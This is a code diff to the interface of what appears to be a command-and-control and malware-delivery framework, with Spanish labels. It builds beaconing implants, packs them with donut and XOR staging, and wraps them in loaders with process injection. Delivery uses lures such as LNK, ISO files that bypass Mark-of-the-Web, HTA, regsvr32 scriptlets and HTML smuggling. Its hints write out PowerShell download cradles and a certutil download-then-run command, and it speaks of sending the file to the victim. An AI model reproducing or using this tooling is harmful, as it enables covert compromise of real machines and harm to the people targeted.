@@ -1006,29 +1006,51 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
             <!-- ── Delivery mode ── -->
             <div id="mode-delivery" style="display:none">
-              <div style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:8px">③ Tipo de entrega</div>
-              <div class="form-row">
-                <label>Formato</label>
+              <!-- ① Agente a embeber -->
+              <div style="border:1px solid var(--border);border-radius:6px;padding:10px;display:flex;flex-direction:column;gap:8px;margin-bottom:10px">
+                <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--accent)">① Agente a embeber</div>
+                <div style="font-size:10px;color:var(--text3)">El servidor compila este agente, lo convierte a shellcode (donut) y lo stagea automáticamente.</div>
+
+                <div class="form-row" style="margin:0">
+                  <label style="margin-bottom:4px">Lenguaje</label>
+                  <div class="seg-grp" style="flex-wrap:wrap">
+                    <button class="seg-btn seg-on" id="dlv-lang-go"   onclick="dlvSetLang('go')">Go</button>
+                    <button class="seg-btn"         id="dlv-lang-nim"  onclick="dlvSetLang('nim')">Nim</button>
+                    <button class="seg-btn"         id="dlv-lang-rust" onclick="dlvSetLang('rust')">Rust</button>
+                    <button class="seg-btn"         id="dlv-lang-c"    onclick="dlvSetLang('c')">C</button>
+                  </div>
+                </div>
+              </div>
+
+              <!-- ② Formato de entrega -->
+              <div style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:6px">② Formato de entrega</div>
+              <div class="form-row" style="margin-bottom:8px">
+                <label>Tipo</label>
                 <select id="dlv-fmt2" onchange="setDeliveryFmt(this.value)">
                   <optgroup label="MOTW bypass">
-                    <option value="lnk">LNK — shortcut</option>
+                    <option value="lnk">LNK — shortcut (PowerShell cradle)</option>
                     <option value="iso">ISO + LNK — MOTW bypass</option>
                   </optgroup>
-                  <optgroup label="Script dropper">
+                  <optgroup label="Script dropper (PS cradle)">
                     <option value="hta">HTA — mshta.exe</option>
                     <option value="bat">BAT → PS cradle</option>
                     <option value="ps1">PS1 — PowerShell</option>
                     <option value="jscript">JScript (.js) — wscript</option>
-                    <option value="vbscript">VBScript (.vbs)</option>
-                    <option value="sct">SCT — regsvr32</option>
+                    <option value="vbscript">VBScript (.vbs) — wscript</option>
+                    <option value="sct">SCT — regsvr32 /i</option>
                   </optgroup>
                   <optgroup label="Sin staging">
-                    <option value="html">HTML smuggling (EXE embebido)</option>
+                    <option value="html">HTML smuggling (EXE embebido + autodownload)</option>
                   </optgroup>
                 </select>
               </div>
+
+              <!-- Hint dinámico por formato -->
+              <div id="dlv-fmt-hint" style="font-size:10px;color:var(--text3);background:var(--bg4);border-radius:4px;padding:6px 8px;margin-bottom:8px;display:none"></div>
+
+              <!-- C2 / Stage URL -->
               <div id="dlv-stageurl-row2">
-                <label style="font-size:11px;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.3px;display:block;margin-bottom:6px">Stage URL</label>
+                <label style="font-size:11px;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.3px;display:block;margin-bottom:4px">C2 / Stage URL <span style="font-weight:400;color:var(--text3);text-transform:none">(base URL donde el agente beacona y se hostean los stages)</span></label>
 
                 <!-- Banner: tunnel activo -->
                 <div id="dlv-tun-active" style="display:none;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.35);border-radius:5px;padding:7px 10px;margin-bottom:6px">
@@ -1042,7 +1064,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
                 <!-- Input manual -->
                 <div style="display:flex;gap:6px;margin-bottom:6px">
-                  <input id="dlv-stageurl2" placeholder="https://xxx.trycloudflare.com  (o lanza un tunnel abajo)" style="flex:1">
+                  <input id="dlv-stageurl2" placeholder="https://xxx.trycloudflare.com" style="flex:1">
                   <button class="btn btn-ghost btn-sm" onclick="dlvFill2()" title="Rellenar desde tunnel activo">↙</button>
                 </div>
 
@@ -1066,11 +1088,15 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                   </div>
                 </div>
               </div>
-              <div class="form-row">
-                <label>Nombre del lure <span style="font-weight:400;color:var(--text3)">(sin extensión)</span></label>
+
+              <!-- Lure name -->
+              <div class="form-row" style="margin-top:8px">
+                <label>Nombre del lure <span style="font-weight:400;color:var(--text3)">(sin extensión — el archivo que ve la víctima)</span></label>
                 <input id="dlv-lurename2" value="Invoice_Q4">
               </div>
-              <div style="margin-top:10px">
+
+              <!-- Build options -->
+              <div style="margin-top:8px">
                 <div style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:6px">Opciones de build</div>
                 <div style="display:flex;gap:8px;flex-wrap:wrap">
                   <label class="build-opt" id="dlv-opt-garble" style="flex:1;min-width:120px">
@@ -1087,16 +1113,28 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
             <!-- ── Stager mode ── -->
             <div id="mode-stager" style="display:none">
-              <div style="font-size:10px;background:var(--bg4);border-radius:4px;padding:8px 10px;margin-bottom:10px;color:var(--text3);line-height:1.6">
-                Stager mínimo en C (~17KB). Descarga shellcode raw desde la Stage URL y lo ejecuta directamente.<br>
-                <span style="color:var(--text2)">No requiere agente precompilado — apunta a un endpoint <code>/stage/&lt;token&gt;</code> existente.</span>
+              <!-- What is a stager -->
+              <div style="background:rgba(83,130,255,.07);border:1px solid rgba(83,130,255,.25);border-radius:6px;padding:10px 12px;margin-bottom:10px;font-size:10px;line-height:1.7;color:var(--text2)">
+                <div style="font-weight:700;color:var(--accent);margin-bottom:4px">¿Qué es el stager?</div>
+                <div>EXE mínimo en C (~17 KB, sin CRT). Hace un GET WinHTTP a la <strong>Stage URL</strong>, carga el shellcode raw en memoria (VirtualAlloc RX) y lo ejecuta via CreateThread.</div>
+                <div style="margin-top:6px;color:var(--text3)"><strong style="color:var(--text2)">Stage URL</strong> = endpoint <code>/stage/&lt;token&gt;</code> que sirve shellcode raw. <br>Usa primero el modo <strong>Loader</strong> para generar un agente stageable — la URL aparece en el resultado.</div>
               </div>
-              <div class="form-row" style="margin-bottom:8px">
-                <label>Stage URL <span style="font-weight:400;color:var(--text3)">(p.ej. https://10.0.0.1:8443/stage/abc123)</span></label>
+
+              <!-- Stage URL input -->
+              <div class="form-row" style="margin-bottom:6px">
+                <label style="margin-bottom:4px">Stage URL</label>
                 <div style="display:flex;gap:5px">
-                  <input id="stager-stage-url" placeholder="https://host:port/stage/token" style="flex:1">
+                  <input id="stager-stage-url" placeholder="https://host:port/stage/token" style="flex:1;font-family:var(--font-mono);font-size:11px">
+                  <button class="btn btn-ghost btn-sm" onclick="stagerFillFromLoader()" title="Rellenar desde último build de Loader">⬆ Loader</button>
                   <button class="btn btn-ghost btn-sm" onclick="stagerFillFromTunnel()" title="Rellenar desde tunnel activo">↙</button>
                 </div>
+                <div style="font-size:10px;color:var(--text3);margin-top:3px">Ej: <code>https://10.10.10.1:8443/stage/abc123ef</code></div>
+              </div>
+
+              <!-- Last loader stage URL (auto-populated hint) -->
+              <div id="stager-last-loader" style="display:none;background:var(--bg4);border-radius:4px;padding:6px 8px;font-size:10px;color:var(--text3);margin-bottom:6px">
+                Último Loader: <code id="stager-last-url" style="color:var(--text2)"></code>
+                <button class="btn btn-ghost btn-sm" onclick="stagerFillFromLoader()" style="padding:1px 6px;font-size:10px;margin-left:6px">Usar ↑</button>
               </div>
             </div>
 
@@ -1341,59 +1379,109 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
             <!-- Pipeline explainer -->
             <div style="font-size:10px;color:var(--text3);background:var(--bg4);border-radius:4px;padding:7px 10px;line-height:1.6">
               El servidor hace todo automáticamente:<br>
-              <span style="color:var(--text2)">build EXE → donut → zlib+XOR → staged en C2 → loader EXE con clave + URL integradas</span><br>
-              Solo distribuyes el loader. El payload nunca está embebido.
+              <span style="color:var(--text2)">build implant → donut → zlib+XOR → staged en C2 → loader EXE con clave + URL integradas</span><br>
+              Distribuyes <strong style="color:var(--text1)">solo el loader (~50KB–9MB)</strong>. El implant se descarga en runtime.
             </div>
 
-            <!-- Stage URL = C2 HTTP base -->
-            <div class="form-row">
-              <label>C2 HTTP URL <span style="font-weight:400;color:var(--text3)">(donde el agente llama a casa y se hostea el staged payload)</span></label>
-              <div style="display:flex;gap:6px">
-                <input id="ldr-url" placeholder="http://10.0.0.1:8080" style="flex:1">
-                <button class="btn btn-ghost btn-sm" onclick="ldrFillURL()" title="Rellenar desde tunnel activo">↙</button>
+            <!-- ① IMPLANT A STAGEAR -->
+            <div style="border:1px solid var(--border);border-radius:6px;padding:10px;display:flex;flex-direction:column;gap:8px">
+              <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--accent)">① Implant a stagear</div>
+
+              <!-- Lang del agente -->
+              <div class="form-row" style="margin:0">
+                <label style="margin-bottom:4px">Lenguaje del agente</label>
+                <div class="seg-grp" style="flex-wrap:wrap">
+                  <button class="seg-btn seg-on" id="ldr-lang-go"   onclick="ldrSetLang('go')">Go</button>
+                  <button class="seg-btn"         id="ldr-lang-nim"  onclick="ldrSetLang('nim')">Nim</button>
+                  <button class="seg-btn"         id="ldr-lang-rust" onclick="ldrSetLang('rust')">Rust</button>
+                  <button class="seg-btn"         id="ldr-lang-c"    onclick="ldrSetLang('c')">C</button>
+                </div>
+              </div>
+
+              <!-- Transport del agente -->
+              <div class="form-row" style="margin:0">
+                <label style="margin-bottom:4px">Transport</label>
+                <div class="seg-grp" style="flex-wrap:wrap">
+                  <button class="seg-btn seg-on" id="ldr-tr-http"  onclick="ldrSetTransport('http')">HTTP</button>
+                  <button class="seg-btn"         id="ldr-tr-https" onclick="ldrSetTransport('https')">HTTPS</button>
+                  <button class="seg-btn"         id="ldr-tr-mtls"  onclick="ldrSetTransport('mtls')">mTLS</button>
+                  <button class="seg-btn"         id="ldr-tr-tcp"   onclick="ldrSetTransport('tcp')">TCP</button>
+                </div>
+              </div>
+
+              <!-- C2 URL -->
+              <div class="form-row" style="margin:0">
+                <label style="margin-bottom:4px">C2 URL <span style="font-weight:400;color:var(--text3)">(donde beacona el agente y se hostea el stage)</span></label>
+                <div style="display:flex;gap:6px">
+                  <input id="ldr-url" placeholder="http://10.0.0.1:8080" style="flex:1" oninput="ldrUpdatePreview()">
+                  <button class="btn btn-ghost btn-sm" onclick="ldrFillURL()" title="Rellenar desde tunnel activo">↙</button>
+                </div>
+              </div>
+
+              <!-- Sleep / Jitter -->
+              <div class="form-row-inline" style="grid-template-columns:1fr 1fr;margin:0">
+                <div class="form-row" style="margin:0">
+                  <label>Sleep (sec)</label>
+                  <input id="ldr-sleep" value="5" type="number" min="1">
+                </div>
+                <div class="form-row" style="margin:0">
+                  <label>Jitter (%)</label>
+                  <input id="ldr-jitter" value="20" type="number" min="0" max="100">
+                </div>
+              </div>
+
+              <!-- Preview dinámico -->
+              <div id="ldr-implant-preview" style="font-size:11px;color:var(--green);background:var(--bg4);border-radius:4px;padding:5px 8px;font-family:monospace">
+                agent_http_go.exe → beacons to 10.0.0.1:8080
               </div>
             </div>
 
-            <!-- C2 comms config for the embedded agent -->
-            <div class="form-row-inline" style="grid-template-columns:1fr 1fr">
-              <div class="form-row">
-                <label>Sleep (sec)</label>
-                <input id="ldr-sleep" value="5" type="number" min="1">
-              </div>
-              <div class="form-row">
-                <label>Jitter (%)</label>
-                <input id="ldr-jitter" value="20" type="number" min="0" max="100">
-              </div>
-            </div>
+            <!-- ② WRAPPER DEL LOADER -->
+            <div style="border:1px solid var(--border);border-radius:6px;padding:10px;display:flex;flex-direction:column;gap:8px">
+              <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--accent)">② Wrapper del loader</div>
+              <div style="font-size:10px;color:var(--text3)">El ejecutable pequeño que distribuyes. Descarga y ejecuta el implant en memoria.</div>
 
-            <!-- Loader type -->
-            <div class="form-row">
-              <label>Tipo de loader</label>
-              <select id="ldr-type">
-                <option value="loader" data-opsec="true">Go — fileless, WinHTTP (~9MB)</option>
-                <option value="loader-c">C — WinHTTP nativo (~50KB)</option>
-                <option value="loader-nim">Nim (~300KB)</option>
-              </select>
-              
-            </div>
-
-            <!-- Arch + Garble -->
-            <div class="form-row-inline">
-              <div class="form-row">
-                <label>Arquitectura</label>
-                <select id="ldr-arch">
-                  <option value="amd64">x64</option>
-                  <option value="386">x86</option>
-                  <option value="arm64">ARM64</option>
+              <div class="form-row" style="margin:0">
+                <label>Tipo</label>
+                <select id="ldr-type" onchange="ldrUpdatePreview()">
+                  <option value="loader">Go — fileless, CreateThread / APC (~9MB)</option>
+                  <option value="loader-c">C — WinHTTP nativo (~50KB)</option>
+                  <option value="loader-nim">Nim (~300KB)</option>
                 </select>
               </div>
-              <div class="form-row" style="display:flex;align-items:flex-end">
-                <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;text-transform:none;color:var(--text);margin-bottom:0">
-                  <input type="checkbox" id="ldr-garble">
-                  <span>Garble</span>
-                  
-                </label>
+
+              <!-- Arch + Garble -->
+              <div class="form-row-inline" style="grid-template-columns:1fr 1fr;margin:0">
+                <div class="form-row" style="margin:0">
+                  <label>Arquitectura</label>
+                  <select id="ldr-arch">
+                    <option value="amd64">x64</option>
+                    <option value="386">x86</option>
+                    <option value="arm64">ARM64</option>
+                  </select>
+                </div>
+                <div class="form-row" style="display:flex;align-items:flex-end;margin:0">
+                  <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;text-transform:none;color:var(--text);margin-bottom:0">
+                    <input type="checkbox" id="ldr-garble">
+                    <span>Garble</span>
+                  </label>
+                </div>
               </div>
+
+              <!-- Opciones avanzadas (collapsible) -->
+              <details style="font-size:11px">
+                <summary style="cursor:pointer;color:var(--text2);font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.4px">⚙ Opciones avanzadas</summary>
+                <div style="display:flex;flex-direction:column;gap:7px;margin-top:8px">
+                  <div class="form-row" style="margin:0">
+                    <label>Proceso sacrificial <span style="font-weight:400;color:var(--text3)">(APC injection target)</span></label>
+                    <input id="ldr-proc" placeholder="C:\Windows\System32\dllhost.exe" style="font-size:11px">
+                  </div>
+                  <div class="form-row" style="margin:0">
+                    <label>Max descargas del stage <span style="font-weight:400;color:var(--text3)">(0 = ilimitado)</span></label>
+                    <input id="ldr-maxdl" value="0" type="number" min="0" style="width:80px">
+                  </div>
+                </div>
+              </details>
             </div>
 
             <button class="btn btn-primary" onclick="buildLoader()" style="width:100%">⚙ Build Loader</button>
@@ -11080,9 +11168,37 @@ function setLoaderFmt(fmt) {
   });
 }
 
+let _dlvLang = 'go';
+
+function dlvSetLang(lang) {
+  _dlvLang = lang;
+  ['go','nim','rust','c'].forEach(l => {
+    const b = document.getElementById(`dlv-lang-${l}`);
+    if (b) b.classList.toggle('seg-on', l === lang);
+  });
+}
+
+const _dlvFmtHints = {
+  lnk:      'El LNK ejecuta powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&lt;StageURL&gt;) — descarga y ejecuta el agente en memoria.',
+  iso:      'ISO montable que contiene el LNK. Evita MOTW (Mark-of-the-Web) porque el volumen montado no hereda la zona de Internet.',
+  hta:      'HTA = HTML Application. Lo ejecuta mshta.exe (trusted binary). PS cradle en el onload del VBScript.',
+  bat:      'BAT minimalista que llama a PowerShell con un cradle codificado en base64.',
+  ps1:      'Script PowerShell puro. IEX + DownloadString o DownloadData + shellcode injection vía CreateThread reflective.',
+  jscript:  'JScript (.js) lanzado con wscript.exe. Usa ActiveXObject(\"WScript.Shell\") para PS cradle.',
+  vbscript: 'VBScript (.vbs) con CreateObject(\"WScript.Shell\"). Compatible con cualquier Windows moderno.',
+  sct:      'Scriptlet COM (.sct). Se registra y ejecuta via: regsvr32 /s /n /u /i:&lt;URL&gt; scrobj.dll',
+  html:     'EXE del agente embebido en base64 dentro del HTML. Al abrir, JS hace auto-download. No necesita Stage URL — el agente va dentro del archivo.',
+};
+
 function setDeliveryFmt(fmt) {
   const stageRow = document.getElementById('dlv-stageurl-row2');
   if (stageRow) stageRow.style.display = fmt === 'html' ? 'none' : '';
+  const hint = document.getElementById('dlv-fmt-hint');
+  if (hint) {
+    const msg = _dlvFmtHints[fmt];
+    if (msg) { hint.innerHTML = msg; hint.style.display = ''; }
+    else hint.style.display = 'none';
+  }
 }
 
 function dlvFill2() {
@@ -11231,6 +11347,7 @@ async function unifiedBuild() {
     const body = {
       format: fmt, stage_url: stageURL || undefined,
       server_url: c2url, transport: trans,
+      lang: _dlvLang,
       sleep_sec: sleep, jitter_pct: jit,
       output_name: lure || undefined,
       lure_name: lure || undefined,
@@ -11255,9 +11372,18 @@ async function unifiedBuild() {
       res.innerHTML = `<div class="result-card" style="color:var(--red)">${esc(r.error || 'Error')}</div>`;
     } else {
       const d = r.data || {};
+      const exePath = d.exe || d.path || '';
+      const fname   = exePath.split('/').pop() || 'stager.exe';
       res.innerHTML = `<div style="background:rgba(83,130,255,.08);border:1px solid var(--accent);border-radius:6px;padding:10px 12px">
-        <div style="font-size:10px;font-weight:600;color:var(--accent);margin-bottom:4px">→ Stager listo</div>
-        <div style="font-family:var(--font-mono);font-size:11px;color:var(--text);word-break:break-all">${esc(d.exe || d.path || '')}</div>
+        <div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Stager listo</div>
+        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+          <code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(fname)}</code>
+          <a href="/api/download?path=${encodeURIComponent(exePath)}" download="${esc(fname)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>
+        </div>
+        <div style="font-size:10px;color:var(--text3);line-height:1.6">
+          Lenguaje: C (WinHTTP, sin CRT) · ~17 KB<br>
+          Stage URL embebida: <code style="color:var(--text2)">${esc(stageURL)}</code>
+        </div>
       </div>`;
       toast('Stager compilado', 'green');
     }
@@ -11270,17 +11396,42 @@ function renderUnifiedResult(resEl, r) {
     return;
   }
   const d = r.data || {};
-  // Determine the primary deliverable
-  const deliverKey = d.loader || d.lnk || d.iso || d.hta || d.ps1 || d.bat || d.html || d.exe || d.bin || d.dll;
+
+  // Save stage URL for stager quick-fill
+  const stageURLFound = d.stage_url || d.bin_stage || '';
+  if (stageURLFound) {
+    _lastLoaderStageURL = stageURLFound;
+    const hint = document.getElementById('stager-last-loader');
+    const hurl = document.getElementById('stager-last-url');
+    if (hint) hint.style.display = '';
+    if (hurl) hurl.textContent = stageURLFound;
+  }
+
+  // Determine primary deliverable file
+  const deliverPath = d.loader || d.lnk || d.iso || d.hta || d.ps1 || d.bat || d.html || d.exe || d.bin || d.dll || '';
+  const deliverName = deliverPath.split('/').pop() || '';
   let html = '';
-  if (deliverKey) {
+
+  if (deliverPath) {
     html += `<div style="background:rgba(83,130,255,.08);border:1px solid var(--accent);border-radius:6px;padding:10px 12px;margin-bottom:8px">`;
-    html += `<div style="font-size:10px;font-weight:600;color:var(--accent);margin-bottom:4px">→ Envía este archivo a la víctima</div>`;
-    html += `<div style="font-family:var(--font-mono);font-size:11px;color:var(--text);word-break:break-all">${esc(deliverKey)}</div>`;
-    if (d.bin_stage) html += `<div style="font-size:10px;color:var(--text3);margin-top:4px">Payload staged en: ${esc(d.bin_stage)}</div>`;
+    html += `<div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Artefacto listo</div>`;
+    html += `<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:6px">`;
+    html += `<code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(deliverName)}</code>`;
+    html += `<a href="/api/download?path=${encodeURIComponent(deliverPath)}" download="${esc(deliverName)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>`;
+    html += `</div>`;
+    if (d.stage_url || d.bin_stage) {
+      const su = d.stage_url || d.bin_stage;
+      html += `<div style="font-size:10px;color:var(--text3);margin-top:2px">Stage URL: <code style="color:var(--text2)">${esc(su)}</code>`;
+      html += ` <button class="btn btn-ghost btn-sm" style="padding:1px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${su.replace(/'/g,"\\'")}').then(()=>toast('Copiado','green'))">⎘</button></div>`;
+    }
+    if (d.raw_size && d.compressed_size) {
+      const savings = Math.round((1 - d.compressed_size / d.raw_size) * 100);
+      html += `<div style="font-size:10px;color:var(--text3);margin-top:2px">Implant: ${(d.raw_size/1024).toFixed(0)} KB → ${(d.compressed_size/1024).toFixed(0)} KB comprimido (${savings}% reducción)</div>`;
+    }
     html += `</div>`;
   }
-  // Show remaining info collapsed
+
+  // Collapsible raw JSON
   html += `<details style="margin-top:4px"><summary style="font-size:10px;color:var(--text3);cursor:pointer">Ver todos los artefactos</summary>`;
   html += `<div class="result-card">${esc(JSON.stringify(d, null, 2))}</div></details>`;
   resEl.innerHTML = html;
@@ -11333,6 +11484,52 @@ function ldrFillURL() {
   if (host) document.getElementById('ldr-url').value = `${_ls}://${host}:${port}`;
 }
 
+let _ldrLang      = 'go';
+let _ldrTransport = 'http';
+
+function ldrSetLang(lang) {
+  _ldrLang = lang;
+  document.querySelectorAll('[id^="ldr-lang-"]').forEach(b => b.classList.remove('seg-on'));
+  document.getElementById('ldr-lang-' + lang)?.classList.add('seg-on');
+  ldrUpdatePreview();
+}
+
+function ldrSetTransport(tr) {
+  _ldrTransport = tr;
+  document.querySelectorAll('[id^="ldr-tr-"]').forEach(b => b.classList.remove('seg-on'));
+  document.getElementById('ldr-tr-' + tr)?.classList.add('seg-on');
+  ldrUpdatePreview();
+}
+
+function ldrUpdatePreview() {
+  const urlRaw = (document.getElementById('ldr-url')?.value || '').trim();
+  let host = urlRaw.replace(/^https?:\/\//, '').split('/')[0] || '10.0.0.1:8080';
+  const names = {go:'Go', nim:'Nim', rust:'Rust', c:'C'};
+  const trs   = {http:'HTTP', https:'HTTPS', mtls:'mTLS', tcp:'TCP'};
+  const fmt   = document.getElementById('ldr-type')?.value || 'loader';
+  const wrappers = {'loader':'Go loader (~9MB)', 'loader-c':'C loader (~50KB)', 'loader-nim':'Nim loader (~300KB)'};
+  const preview = document.getElementById('ldr-implant-preview');
+  if (preview) {
+    preview.innerHTML =
+      `<span style="color:var(--text3)">Implant:</span> <b>agent_${_ldrTransport}_${_ldrLang}.exe</b>` +
+      ` <span style="color:var(--text3)">→ beacons to</span> <b>${esc(host)}</b>` +
+      `<br><span style="color:var(--text3)">Wrapper:</span> <b>${wrappers[fmt] || fmt}</b>`;
+  }
+}
+
+function ldrFillURL() {
+  const h = document.getElementById('pay-host')?.value || document.getElementById('ldr-url')?.placeholder || '';
+  const port = document.getElementById('pay-port')?.value || '8080';
+  const tr = _ldrTransport;
+  const scheme = (tr === 'https' || tr === 'mtls') ? 'https' : 'http';
+  if (h) {
+    const el = document.getElementById('ldr-url');
+    if (el) { el.value = `${scheme}://${h}:${port}`; ldrUpdatePreview(); }
+  } else {
+    toast('No hay tunnel activo ni host configurado', 'red');
+  }
+}
+
 async function buildLoader() {
   const stageURL = (document.getElementById('ldr-url').value || '').trim();
   if (!stageURL) { toast('C2 HTTP URL requerida', 'red'); return; }
@@ -11340,31 +11537,53 @@ async function buildLoader() {
   const loaderFmt = document.getElementById('ldr-type').value;
   const garble    = document.getElementById('ldr-garble').checked;
   const arch      = document.getElementById('ldr-arch').value;
-  const sleep     = parseInt(document.getElementById('ldr-sleep').value) || 60;
+  const sleep     = parseInt(document.getElementById('ldr-sleep').value) || 5;
   const jitter    = parseInt(document.getElementById('ldr-jitter').value) || 20;
+  const lang      = _ldrLang || 'go';
+  const transport = _ldrTransport || 'http';
+  const maxdl     = parseInt(document.getElementById('ldr-maxdl')?.value) || 0;
+  const proc      = (document.getElementById('ldr-proc')?.value || '').trim();
 
-  // stage_url = C2 HTTP base URL (where the agent beacons AND where the
-  // server will host the staged/encrypted shellcode blob automatically).
-  // The server does: build EXE → donut → zlib+XOR → stage → loader EXE with key+URL.
   const body = {
-    format:     loaderFmt,
-    stage_url:  stageURL,
-    server_url: stageURL,   // agent also beacons to the same URL
-    transport:  'http',
-    sleep_sec:  sleep,
-    jitter_pct: jitter,
-    garble:     garble,
-    arch:       arch,
+    format:        loaderFmt,
+    stage_url:     stageURL,
+    server_url:    stageURL,
+    lang:          lang,
+    transport:     transport,
+    sleep_sec:     sleep,
+    jitter_pct:    jitter,
+    garble:        garble,
+    arch:          arch,
+    stage_max_dl:  maxdl,
+    ...(proc ? { sacrificial_proc: proc } : {}),
   };
 
   const res = document.getElementById('ldr-result');
-  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Building… (donut + staging pueden tardar ~30s)</div>';
+  res.innerHTML = '<div class="result-card" style="color:var(--yellow)">⏳ Building… (implant + donut + staging ~30s)</div>';
   const r = await api('POST', '/api/build', body);
   if (r.ok) {
-    res.innerHTML = `<div class="result-card">${esc(JSON.stringify(r.data, null, 2))}</div>`;
+    const d = r.data || {};
+    const loaderFile = (d.loader || '').split('/').pop();
+    const rawKB      = d.raw_kb || '?';
+    const compKB     = d.compressed_kb || '?';
+    const stageEndpt = d.bin_stage || '';
+    const token      = stageEndpt.split('/stage/')[1] || '';
+    const dlURL      = loaderFile ? `/api/artifacts/${encodeURIComponent(loaderFile)}?token=${token || ''}` : '';
+    res.innerHTML = `
+      <div class="result-card" style="border-color:var(--green)">
+        <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo</div>
+        <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
+          <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
+          <div><span style="color:var(--text3)">Implant stageado:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
+          <div><span style="color:var(--text3)">Tamaño:</span> ${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> comprimido (XOR)</div>
+          <div style="word-break:break-all"><span style="color:var(--text3)">Stage URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code></div>
+          ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
+        </div>
+        ${dlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}" style="margin-top:8px;display:inline-block" download>⬇ Download loader</a>` : ''}
+      </div>`;
     toast('Loader built!', 'green');
   } else {
-    res.innerHTML = `<div class="result-card" style="color:var(--red)">${esc(r.error || 'Error building loader')}</div>`;
+    res.innerHTML = `<div class="result-card" style="color:var(--red)">✗ ${esc(r.error || 'Error building loader')}</div>`;
   }
 }
 
@@ -11748,6 +11967,19 @@ function payFillStagerURL() {
     toast('Stage URL filled from active tunnel');
   } else {
     toast('No active tunnel — start one in the Stager tab', 'error');
+  }
+}
+
+let _lastLoaderStageURL = '';
+
+function stagerFillFromLoader() {
+  const el = document.getElementById('stager-stage-url');
+  if (!el) return;
+  if (_lastLoaderStageURL) {
+    el.value = _lastLoaderStageURL;
+    toast('Stage URL del último Loader cargada', 'green');
+  } else {
+    toast('Aún no has generado ningún Loader — ve a modo Loader, genera uno y vuelve aquí', 'yellow');
   }
 }
 
@@ -17242,7 +17474,10 @@ async function ipcRun(action) {
       // so the agent survives when cmd.exe exits. start /b shares cmd's console and the
       // agent dies when that console closes (CTRL_CLOSE_EVENT).
       const rpInjBs = rpInj.replace(/\//g, '\\');
-      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && wmic process call create ${rpInjBs}`;
+      // Use forward slashes throughout: avoids (1) bash quoting breakage from nested "..." around
+      // -c arg, (2) dead-key translation loss of \U \P \a via xfreerdp keyboard mapping.
+      // Start-Process: fully detached, no admin. PowerShell and certutil both accept forward slashes.
+      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && powershell -nop -w hidden -c Start-Process ${rpInj}`;
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
@@ -17292,18 +17527,22 @@ async function ipcRun(action) {
           `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/01b_after_click.xwd" 2>/dev/null && ${scr} "$SCRDIR/01b_after_click.xwd" "$SCRDIR/01b_after_click.png" && echo "[*] Screenshot 01b_after_click saved"`,
           // Dismiss any active modal dialogs (e.g. PowerShell credential request, leftover Run dialog
           // error, or file picker from a prior session) — send more Escapes to clear all layers.
-          `echo "[*] Sending Escape x6 to dismiss any active modal dialogs..."`,
-          `DISPLAY="$VDISP" xdotool key Escape`,
+          `echo "[*] Closing leftover dialogs (Alt+F4 x4 then Escape x4)..."`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
+          `sleep 0.3`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
+          `sleep 0.3`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
+          `sleep 0.3`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers alt+F4`,
+          `sleep 0.3`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.2`,
-          `DISPLAY="$VDISP" xdotool key Escape`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.2`,
-          `DISPLAY="$VDISP" xdotool key Escape`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.2`,
-          `DISPLAY="$VDISP" xdotool key Escape`,
-          `sleep 0.2`,
-          `DISPLAY="$VDISP" xdotool key Escape`,
